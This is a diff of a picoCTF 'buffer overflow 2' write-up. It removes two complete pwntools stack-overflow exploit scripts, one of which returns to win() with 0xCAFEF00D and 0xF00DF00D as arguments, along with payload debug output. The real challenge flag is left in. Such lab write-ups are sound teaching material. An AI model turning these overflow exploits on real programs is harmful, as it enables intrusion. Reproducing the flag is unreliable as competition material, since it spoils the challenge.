@@ -180,97 +180,7 @@ gef➤
 
 Doing the math we get the offset `0xffffd03c - 0xffffcfcc = 0x70`
 
-Now here's the script but this time i won't pass in any arugment i'll just return to the win function
-
-```
-from pwn import *
-
-
-# Allows you to switch between local/GDB/remote from terminal
-def start(argv=[], *a, **kw):
-    if args.GDB:  # Set GDBscript below
-        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
-    elif args.REMOTE:  # ('server', 'port')
-        return remote(sys.argv[1], sys.argv[2], *a, **kw)
-    else:  # Run locally
-        return process([exe] + argv, *a, **kw)
-
-
-# Find offset to EIP/RIP for buffer overflows
-def find_ip(payload):
-    # Launch process and send payload
-    p = process(exe, level='warn')
-    p.sendlineafter(b':', payload)
-    # Wait for the process to crash
-    p.wait()
-    # Print out the address of EIP/RIP at the time of crashing
-    ip_offset = cyclic_find(p.corefile.pc)  # x86
-    #ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
-    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
-    return ip_offset
-
-
-# Binary filename
-exe = './vuln'
-# This will automatically get context arch, bits, os etc
-elf = context.binary = ELF(exe, checksec=False)
-# Change logging level to help with debugging (error/warning/info/debug)
-context.log_level = 'debug'
-
-# ===========================================================
-#                    EXPLOIT GOES HERE
-# ===========================================================
-
-
-# Pass in pattern_size, get back EIP/RIP offset
-offset = 0x70
-
-# Start program
-io = start()
-
-padding = "A" * offset
-
-# Build the payload
-payload = flat([
-    padding,
-    elf.functions['win']
-    ])
-
-# Send the payload
-io.sendlineafter(b':', payload)
-
-# Got Flag?
-io.interactive()
-```
-
-On running it nothing really happen
-
-```
-└─$ python2 exploit.py
-[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
-[+] Starting local process './vuln': pid 27937
-[DEBUG] Received 0x1b bytes:
-    'Please enter your string: \n'
-[DEBUG] Sent 0x75 bytes:
-    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
-    *
-    00000070  96 92 04 08  0a                                     │····│·│
-    00000075
-[*] Switching to interactive mode
- 
-[DEBUG] Received 0x75 bytes:
-    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
-    *
-    00000070  96 92 04 08  0a                                     │····│·│
-    00000075
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04
-[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 27937)
-[*] Got EOF while reading in interactive
-$ 
-[DEBUG] Sent 0x1 bytes:
-    '\n' * 0x1
-[*] Got EOF while sending in interactive
-```
+Jumping to the win function will not give us the flag
 
 This is because the win function needs to argument to be passed for it to print the flag `win(param_1, param2)` where param_1 = 0xCAFEF00D and param_2 = 0xF00DF00D
 
@@ -284,73 +194,7 @@ if (arg1 != 0xCAFEF00D)
   printf(buf);
 ```
 
-So now i'll edit the script to pass the 2 arguments and since this is x86 we can just pass it directly to the stack
-
-```
-from pwn import *
-
-
-# Allows you to switch between local/GDB/remote from terminal
-def start(argv=[], *a, **kw):
-    if args.GDB:  # Set GDBscript below
-        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
-    elif args.REMOTE:  # ('server', 'port')
-        return remote(sys.argv[1], sys.argv[2], *a, **kw)
-    else:  # Run locally
-        return process([exe] + argv, *a, **kw)
-
-
-# Find offset to EIP/RIP for buffer overflows
-def find_ip(payload):
-    # Launch process and send payload
-    p = process(exe, level='warn')
-    p.sendlineafter(b':', payload)
-    # Wait for the process to crash
-    p.wait()
-    # Print out the address of EIP/RIP at the time of crashing
-    ip_offset = cyclic_find(p.corefile.pc)  # x86
-    #ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
-    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
-    return ip_offset
-
-
-# Binary filename
-
-exe = './vuln'
-# This will automatically get context arch, bits, os etc
-elf = context.binary = ELF(exe, checksec=False)
-# Change logging level to help with debugging (error/warning/info/debug)
-context.log_level = 'info'
-
-# ===========================================================
-#                    EXPLOIT GOES HERE
-# ===========================================================
-
-
-# Pass in pattern_size, get back EIP/RIP offset
-offset = 0x70
-
-# Start program
-io = start()
-
-padding = "A" * offset
-
-# Build the payload
-payload = flat([
-    padding,
-    elf.functions['win'],
-    0x0,  #  Return pointer - try changing to main() and step through with GDB!
-    0xCAFEF00D, 
-    0xF00DF00D
-    ])
-
-write('payload', payload)
-# Send the payload
-io.sendlineafter(b':', payload)
-
-# Got Flag?
-io.interactive()
-```
+Here's my solve script [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/picoctf/bo2/exploit.py)
 
 Running it locally
 
@@ -359,12 +203,7 @@ Running it locally
 [!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
 [+] Starting local process './vuln': pid 33669
 [*] Switching to interactive mode
- 
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04
-flag{fake_flag_for_testing}
-[*] Got EOF while reading in interactive
-[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 33669)
-[*] Got EOF while sending in interactive
+[*] flag{fake_flag_for_testing}
 ```
 
 It worked, so i'll run it on the remote server
@@ -375,11 +214,7 @@ It worked, so i'll run it on the remote server
 [!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
 [+] Opening connection to saturn.picoctf.net on port 50844: Done
 [*] Switching to interactive mode
- 
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04
-picoCTF{argum3nt5_4_d4yZ_31432deb}
-[*] Got EOF while reading in interactive
-[*] Interrupted
+[*] picoCTF{argum3nt5_4_d4yZ_31432deb}
 [*] Closed connection to saturn.picoctf.net port 50844
 ```
 
